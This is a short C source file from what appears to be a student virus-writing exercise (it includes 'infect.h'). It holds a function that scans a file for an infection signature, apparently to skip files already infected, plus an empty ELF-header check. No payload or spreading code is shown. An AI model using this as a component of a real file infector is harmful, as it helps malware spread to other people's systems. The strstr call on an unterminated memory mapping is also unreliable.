/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   check.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/04 11:30:42 by mbatty            #+#    #+#             */
/*   Updated: 2026/03/04 11:31:03 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>

int	check_signature(const char *path)
{
	int	fd = open(path, O_RDONLY);
	if (fd == -1)
		return (-1);

	struct stat	stats;
	fstat(fd, &stats);

	if (stats.st_size == 0)
	{
		close(fd);
		return (0);
	}

	char	*file = mmap(NULL, stats.st_size, PROT_READ, MAP_SHARED, fd, 0);
	if (file == MAP_FAILED)
	{
		close(fd);
		return (-1);
	}

	char	*find = strstr(file, SIGNATURE_STR);
	if (find)
	{
		close(fd);
		munmap(file, stats.st_size);
		return (-1);
	}

	munmap(file, stats.st_size);
	close(fd);
	return (0);
}

int	check_elf_hdr(const char *path)
{
	(void)path;
	return (0);
}
